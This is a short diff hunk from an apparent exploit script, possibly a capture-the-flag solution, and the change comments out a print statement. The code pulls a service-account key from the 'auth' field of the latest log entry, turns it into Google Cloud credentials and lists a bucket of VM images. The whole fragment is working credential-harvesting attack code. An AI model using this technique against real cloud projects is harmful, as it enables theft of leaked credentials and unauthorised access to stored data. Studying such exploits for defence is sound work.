@@ -208,7 +208,7 @@ def exploit(nonce, logging_key):
     logs = logger.list_entries()
     # TODO fix sleep could crash if log is delayed
     dev_key = list(logs)[-1].payload['auth']
-    print(dev_key)
+    #print(dev_key)
     storage_client = storage.Client(credentials=service_account.Credentials.from_service_account_info(json.loads(dev_key)))
     blobs = list(storage_client.list_blobs(f'vm-image-bucket-{nonce}'))
     temp_dir = 'test/' ###TODO change me
